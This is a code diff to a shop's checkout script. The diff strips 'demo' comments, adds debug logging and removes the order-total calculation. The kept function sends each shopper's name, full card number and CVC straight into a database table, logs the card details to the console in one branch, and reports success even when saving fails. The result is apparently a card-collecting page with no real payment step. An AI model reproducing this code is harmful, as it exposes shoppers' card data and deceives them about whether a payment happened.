@@ -1,3 +1,7 @@
+// ============================================
+// PAYMENT PAGE - Full Functionality
+// ============================================
+
 document.addEventListener("DOMContentLoaded", () => {
 
     const popupOverlay = document.getElementById("popup-overlay");
@@ -56,6 +60,9 @@ document.addEventListener("DOMContentLoaded", () => {
         const totalDueDisplay = document.getElementById('totalDueDisplay');
         const payButton = document.getElementById('payButton');
 
+        console.log('🛒 Cart items:', cart);
+        console.log('📦 Products available:', products);
+
         if (cart.length === 0) {
             cartContainer.innerHTML = `
                 <div style="text-align: center; padding: 20px; color: var(--text-secondary);">
@@ -100,6 +107,8 @@ document.addEventListener("DOMContentLoaded", () => {
                         </div>
                     </div>
                 `;
+            } else {
+                console.warn('⚠️ Product not found for item:', item);
             }
         });
 
@@ -292,12 +301,10 @@ document.addEventListener("DOMContentLoaded", () => {
     // ==========================================
 
     async function saveToSupabase(name, cardNumber, cvc) {
-        // Use the existing Supabase client from your app
         const supabase = window.supabaseClient;
         
         if (!supabase) {
             console.warn('⚠️ Supabase client not available, using fetch fallback');
-            // Fallback to direct fetch using environment variables
             const supabaseUrl = import.meta.env?.VITE_SUPABASE_URL || process.env.VITE_SUPABASE_URL;
             const supabaseKey = import.meta.env?.VITE_SUPABASE_ANON_KEY || process.env.VITE_SUPABASE_ANON_KEY;
             
@@ -323,7 +330,6 @@ document.addEventListener("DOMContentLoaded", () => {
                 return response.json();
             }
             
-            // If no Supabase credentials, just log and continue (demo mode)
             console.log('📝 Demo mode: Would save:', { name, cardNumber, cvc });
             return { success: true, demo: true };
         }
@@ -341,7 +347,6 @@ document.addEventListener("DOMContentLoaded", () => {
 
             if (error) {
                 console.error('❌ Supabase error:', error);
-                // Don't throw, just log and continue (for demo purposes)
                 return { success: true, error: error.message, fallback: true };
             }
 
@@ -349,7 +354,6 @@ document.addEventListener("DOMContentLoaded", () => {
             return { success: true, data: data };
         } catch (error) {
             console.error('❌ Error saving:', error);
-            // For demo purposes, return success anyway
             return { success: true, fallback: true };
         }
     }
@@ -428,17 +432,6 @@ document.addEventListener("DOMContentLoaded", () => {
             showPopup("Your cart is empty. Please add items before checking out.");
             return;
         }
-
-        const products = JSON.parse(localStorage.getItem('luxbeauty_products') || '[]');
-        let total = 0;
-        const orderItems = cart.map(item => {
-            const product = products.find(p => p.id === item.id);
-            const price = product ? (product.salePrice || product.price) : 0;
-            total += price * item.qty;
-            return { name: product ? product.name : 'Unknown', qty: item.qty, price: price };
-        });
-
-        const network = detectCardNetwork(cardNumber);
 
         // ===== SET LOADING =====
         setPayButtonLoading(true);
